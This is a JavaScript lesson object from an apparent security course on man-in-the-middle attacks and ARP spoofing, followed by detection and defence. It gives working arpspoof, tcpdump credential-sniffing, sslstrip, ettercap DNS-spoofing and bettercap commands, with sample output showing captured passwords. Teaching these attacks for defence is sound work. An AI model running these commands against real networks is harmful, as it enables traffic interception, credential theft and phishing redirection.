export const lesson = {
  id: 'L34',
  title: 'Network Attacks: Man-in-the-Middle & ARP Spoofing',
  slug: 'network-attacks-mitm',
  type: 'PRACTICAL',
  duration: 50,
  xpReward: 35,
  difficulty: 'intermediate',
  module: { title: 'Network Security', slug: 'network-security' },
  course: { title: 'Network Security Fundamentals', slug: 'network-security-fundamentals' },
  keyTerms: [
    'Man-in-the-Middle', 'ARP Spoofing', 'ARP Cache Poisoning',
    'Ettercap', 'arpspoof', 'Bettercap', 'SSL Stripping',
    'HSTS', 'Dynamic ARP Inspection', 'Packet Sniffing'
  ],
  content: [
    { type: 'heading', content: 'Network Attacks: Man-in-the-Middle & ARP Spoofing' },
    { type: 'paragraph', content: 'A Man-in-the-Middle (MitM) attack places the attacker between two communicating parties — intercepting, reading, and potentially modifying all traffic without either side knowing. ARP spoofing is the most common technique to achieve this on local networks.' },

    { type: 'callout', variant: 'info', content: 'Analogy: Imagine you\'re passing notes in class. A MitM attacker is the kid sitting between you and your friend who intercepts every note, reads it, maybe changes it, then passes it along. Both you and your friend think you\'re talking directly to each other — but everything goes through the attacker first.' },

    { type: 'heading', level: 2, content: 'How ARP Works (And Why It\'s Vulnerable)' },
    { type: 'paragraph', content: 'ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. When your computer wants to talk to 192.168.1.1, it broadcasts: "Who has 192.168.1.1? Tell me your MAC address." The router replies with its MAC.' },
    { type: 'paragraph', content: 'The fatal flaw: ARP has NO authentication. Any device can claim to be any IP address, and other devices will believe it without question.' },

    { type: 'command', command: 'arp -a', output: `? (192.168.1.1) at 00:11:22:33:44:55 [ether] on eth0
? (192.168.1.50) at aa:bb:cc:dd:ee:ff [ether] on eth0
? (192.168.1.102) at 08:00:27:xx:yy:zz [ether] on eth0`, explanation: 'Normal ARP table: Each IP maps to one unique MAC address. The gateway (192.168.1.1) has MAC 00:11:22:33:44:55. If this changes unexpectedly, someone is ARP spoofing.' },

    { type: 'heading', level: 2, content: 'The ARP Spoofing Attack' },
    { type: 'paragraph', content: 'The attacker sends fake ARP replies to both the victim and the gateway, poisoning their ARP caches:' },
    { type: 'list', items: [
      '1. Attacker tells the VICTIM: "I am the gateway (192.168.1.1) — my MAC is [attacker_mac]"',
      '2. Attacker tells the GATEWAY: "I am the victim (192.168.1.50) — my MAC is [attacker_mac]"',
      '3. Both victim and gateway update their ARP tables with the attacker\'s MAC',
      '4. All traffic between victim and gateway now flows THROUGH the attacker',
      '5. Attacker forwards packets to maintain connectivity (victim doesn\'t notice)',
      '6. Attacker can read, modify, or drop any packets passing through'
    ]},

    { type: 'callout', variant: 'warning', content: 'Legal warning: Performing ARP spoofing on networks you don\'t own or don\'t have explicit written authorization to test is illegal under computer fraud laws worldwide. Only practice in your own lab environment.' },

    { type: 'heading', level: 2, content: 'Executing ARP Spoofing (Lab Environment)' },
    { type: 'paragraph', content: 'Understanding the attack is essential for defending against it. Here\'s how it works technically:' },

    { type: 'command', command: 'echo 1 > /proc/sys/net/ipv4/ip_forward', output: '', explanation: 'Step 1: Enable IP forwarding on the attacker machine. This makes the attacker forward packets between victim and gateway, maintaining connectivity so the victim doesn\'t notice.' },

    { type: 'command', command: 'arpspoof -i eth0 -t 192.168.1.50 192.168.1.1', output: `8:0:27:aa:bb:cc 8:0:27:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 8:0:27:aa:bb:cc
8:0:27:aa:bb:cc 8:0:27:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 8:0:27:aa:bb:cc
8:0:27:aa:bb:cc 8:0:27:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 8:0:27:aa:bb:cc`, explanation: 'Tells the victim (192.168.1.50) that we are the gateway (192.168.1.1). -t specifies the target, the second IP is who we\'re impersonating. Fake ARP replies are sent continuously.' },

    { type: 'command', command: 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.50', output: `8:0:27:aa:bb:cc 0:11:22:33:44:55 0806 42: arp reply 192.168.1.50 is-at 8:0:27:aa:bb:cc
8:0:27:aa:bb:cc 0:11:22:33:44:55 0806 42: arp reply 192.168.1.50 is-at 8:0:27:aa:bb:cc`, explanation: 'Tells the gateway (192.168.1.1) that we are the victim (192.168.1.50). Now both sides send traffic to us. We\'re in the middle.' },

    { type: 'heading', level: 2, content: 'What the Attacker Can Do Once in the Middle' },

    { type: 'heading', level: 3, content: '1. Sniff Unencrypted Credentials' },
    { type: 'command', command: 'tcpdump -i eth0 -A port 80 | grep -i "pass\\|user\\|login"', output: `POST /login HTTP/1.1
Host: internal-app.company.com
Content-Type: application/x-www-form-urlencoded

username=john.smith&password=Welcome2024!`, explanation: 'Any HTTP traffic passes through the attacker in plain text. Credentials, emails, API keys — all visible. This is why HTTPS is non-negotiable.' },

    { type: 'heading', level: 3, content: '2. SSL Stripping' },
    { type: 'paragraph', content: 'Even HTTPS can be downgraded. The attacker intercepts the initial HTTP request (before the redirect to HTTPS) and maintains an HTTP connection with the victim while connecting to the server via HTTPS.' },
    { type: 'list', items: [
      'Victim types "bank.com" → browser sends HTTP request first',
      'Attacker intercepts the HTTP→HTTPS redirect',
      'Attacker connects to bank.com via HTTPS (secure)',
      'Attacker serves the content back to victim via HTTP (insecure)',
      'Victim sees HTTP in address bar — no padlock, but many users don\'t notice',
      'Defense: HSTS (HTTP Strict Transport Security) forces HTTPS from the first request'
    ]},

    { type: 'command', command: 'sslstrip -l 8080', output: `sslstrip 0.9 by Moxie Marlinspike running...
Listening on port 8080`, explanation: 'sslstrip listens and strips HTTPS redirects, downgrading connections to HTTP. Combined with iptables to redirect port 80 traffic through it.' },

    { type: 'heading', level: 3, content: '3. DNS Spoofing (via MitM)' },
    { type: 'paragraph', content: 'Once in the middle, the attacker can intercept DNS queries and return fake IP addresses, redirecting victims to phishing sites.' },

    { type: 'command', command: 'cat /etc/ettercap/etter.dns', output: `# Redirect bank.com to our phishing server
bank.com      A   192.168.1.200
*.bank.com    A   192.168.1.200
mail.company.com  A   192.168.1.200`, explanation: 'Ettercap DNS spoofing configuration. When the victim tries to visit bank.com, they\'re silently redirected to 192.168.1.200 (the attacker\'s phishing page). The URL in the browser still shows bank.com.' },

    { type: 'heading', level: 2, content: 'Using Bettercap (Modern MitM Framework)' },
    { type: 'paragraph', content: 'Bettercap is the modern successor to Ettercap — it combines ARP spoofing, packet sniffing, credential harvesting, and more in one tool.' },

    { type: 'command', command: 'bettercap -iface eth0', output: `bettercap v2.32.0
[10:30:15] [sys.log] [inf] gateway monitor started
[10:30:15] [sys.log] [inf] started net.recon
192.168.1.0/24 > 192.168.1.200 » net.probe on
192.168.1.0/24 > 192.168.1.200 » set arp.spoof.targets 192.168.1.50
192.168.1.0/24 > 192.168.1.200 » arp.spoof on
[10:30:18] [sys.log] [inf] arp.spoof started targeting 192.168.1.50
192.168.1.0/24 > 192.168.1.200 » net.sniff on
[10:30:20] [net.sniff.http] http://internal.company.com/api/login username=admin&password=Admin123!`, explanation: 'Bettercap in action: probes the network, targets victim 192.168.1.50, starts ARP spoofing, then sniffs HTTP traffic. Within seconds it captures credentials from unencrypted connections.' },

    { type: 'heading', level: 2, content: 'Detecting MitM / ARP Spoofing' },
    { type: 'paragraph', content: 'As a defender, here\'s how to detect these attacks:' },

    { type: 'command', command: 'arp -a | sort', output: `? (192.168.1.1) at 08:00:27:aa:bb:cc [ether] on eth0
? (192.168.1.50) at 08:00:27:aa:bb:cc [ether] on eth0
? (192.168.1.200) at 08:00:27:aa:bb:cc [ether] on eth0`, explanation: 'RED FLAG: Three different IPs all mapping to the SAME MAC address (08:00:27:aa:bb:cc). This means one device is claiming to be multiple IPs — classic ARP spoofing indicator.' },

    { type: 'command', command: 'arpwatch -i eth0', output: `Jun 15 10:35:42 server arpwatch: changed ethernet address 192.168.1.1 00:11:22:33:44:55 (old) 08:00:27:aa:bb:cc (new)
Jun 15 10:35:42 server arpwatch: flip flop 192.168.1.1 08:00:27:aa:bb:cc (new) 00:11:22:33:44:55 (old)`, explanation: 'arpwatch monitors ARP table changes and alerts on anomalies. "changed ethernet address" means the gateway\'s MAC just changed — strong indicator of ARP spoofing. "flip flop" means it\'s alternating between two MACs.' },

    { type: 'heading', level: 2, content: 'Defending Against MitM Attacks' },
    { type: 'list', items: [
      'Use HTTPS everywhere — Encrypts traffic so MitM can\'t read contents',
      'Enable HSTS — Prevents SSL stripping by forcing HTTPS from first connection',
      'Static ARP entries — For critical infrastructure (gateways, servers)',
      'Dynamic ARP Inspection (DAI) — Managed switches validate ARP packets',
      'DHCP Snooping — Builds trusted MAC-IP bindings on the switch',
      '802.1X Port Authentication — Only authorized devices can connect',
      'VPN on untrusted networks — All traffic encrypted through the tunnel',
      'Certificate pinning — Applications verify the exact expected certificate',
      'Network monitoring — Tools like arpwatch detect ARP anomalies',
      'Encrypt everything — SSH not Telnet, SFTP not FTP, HTTPS not HTTP'
    ]},

    { type: 'command', command: 'sudo arp -s 192.168.1.1 00:11:22:33:44:55', output: '', explanation: 'Sets a STATIC ARP entry for the gateway. This can\'t be overwritten by spoofed ARP replies. Good for critical servers, impractical for hundreds of workstations.' },

    { type: 'callout', variant: 'security', content: 'The ultimate defense against MitM is encryption. If ALL your traffic is encrypted (HTTPS, SSH, VPN), an attacker in the middle can see that packets are flowing but cannot read or modify the contents. Defense in depth: use DAI on switches AND encryption on all communications.' },

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'ARP has zero authentication — any device can impersonate any IP on the LAN',
      'MitM gives the attacker full visibility and control of victim\'s traffic',
      'Unencrypted protocols (HTTP, FTP, Telnet) expose credentials instantly',
      'SSL stripping can downgrade HTTPS if HSTS is not configured',
      'Detection: Watch for duplicate MACs, ARP table changes, certificate warnings',
      'Prevention: Encryption (HTTPS/VPN), DAI, DHCP snooping, static ARP for critical hosts',
      'Always assume the local network is hostile — especially public WiFi',
      'MitM is often the first step in a larger attack chain (credential theft → lateral movement)'
    ]},
  ],
  navigation: {
    prev: { title: 'Network Traffic Analysis with Wireshark', slug: 'wireshark-traffic-analysis' },
    next: { title: 'Network Attacks: DDoS, DNS Poisoning & Defense', slug: 'network-attacks-ddos' },
  },
};
